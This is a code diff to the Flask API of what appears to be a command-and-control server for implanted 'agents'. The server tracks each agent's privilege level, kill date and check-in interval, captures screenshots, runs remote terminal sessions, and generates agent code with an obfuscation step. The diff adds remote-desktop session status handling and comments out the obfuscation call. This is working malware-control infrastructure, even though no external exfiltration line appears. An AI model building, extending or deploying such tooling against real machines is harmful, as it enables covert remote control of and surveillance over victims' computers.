@@ -610,8 +610,8 @@ def init_api_routes(app, socketio):
             agent = c.fetchone()
             current_ws_status = agent[0] if agent else 0
 
-            c.execute('''INSERT OR REPLACE INTO agents 
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+            c.execute('''INSERT OR REPLACE INTO agents
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (data['agent_id'],
                     data.get('hostname', 'UNKNOWN'),
                     data.get('ip', '0.0.0.0'),
@@ -620,6 +620,7 @@ def init_api_routes(app, socketio):
                     'online',
                     data.get('privilege', 'user'),
                     current_ws_status,
+                    0,  # rd_connected default
                     data.get('killdate'),  # New killdate field
                     data.get('checkin_interval', 10)  # New checkin_interval field
             ))
@@ -833,6 +834,11 @@ def init_api_routes(app, socketio):
                 c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
                         (ws_connected, data['agent_id']))
                 conn.commit()
+            elif data['task_type'] == 'remote_desktop':
+                rd_connected = 1 if data.get('action') == 'start' else 0
+                c.execute("UPDATE agents SET rd_connected=? WHERE id=?",
+                        (rd_connected, data['agent_id']))
+                conn.commit()
             
             conn.close()
             
@@ -929,17 +935,31 @@ def init_api_routes(app, socketio):
             
             # Handle websocket status updates
             if data['task_type'] == 'websocket':
-                ws_connected = 1 if (data['result'].get('status') == 'success' and 
+                ws_connected = 1 if (data['result'].get('status') == 'success' and
                                 'connected' in data['result'].get('message', '').lower()) else 0
                 c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                         (ws_connected, data['agent_id']))
-                
+
                 socketio.emit('ws_status', {
                     'agent_id': data['agent_id'],
                     'action': data['result'].get('action', ''),
                     'status': 'success' if ws_connected else 'error',
                     'message': data['result'].get('message', '')
                 }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
+
+            # Handle remote desktop status updates
+            if data['task_type'] == 'remote_desktop':
+                rd_connected = 1 if (data['result'].get('status') == 'success' and
+                                'connected' in data['result'].get('message', '').lower()) else 0
+                c.execute('''UPDATE agents SET rd_connected=? WHERE id=?''',
+                        (rd_connected, data['agent_id']))
+
+                socketio.emit('rd_status', {
+                    'agent_id': data['agent_id'],
+                    'action': data['result'].get('action', ''),
+                    'status': 'success' if rd_connected else 'error',
+                    'message': data['result'].get('message', '')
+                }, room=f"remote_desktop_{data['agent_id']}", namespace='/remote_desktop')
             
             # Handle terminal output
             if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
@@ -1116,9 +1136,12 @@ def init_api_routes(app, socketio):
                     app.logger.warning(f"Invalid kill date format: {str(e)}")
                     killdate_enabled = False
 
+            # Get server URL
+            server_url = data.get('server_url', request.url_root).strip('/')
+
             config = {
                 'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
-                'server_url': data.get('server_url', request.url_root).strip('/'),
+                'server_url': server_url,
                 'take_screenshots': bool(data.get('take_screenshots', True)),
                 'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
                 'killdate_enabled': killdate_enabled,
@@ -1167,7 +1190,7 @@ def init_api_routes(app, socketio):
             )
 
             # Apply obfuscation
-            agent_code = _obfuscate_code(agent_code)
+            # agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
@@ -1702,7 +1725,10 @@ def init_api_routes(app, socketio):
                         continue
                 
                 time_diff = (now - last_seen).total_seconds()
-                
+
+                if checkin_interval is None:
+                    checkin_interval = 10
+
                 # Mark as inactive if last seen > 10x checkin interval
                 if time_diff > checkin_interval * 10:
                     c.execute('''
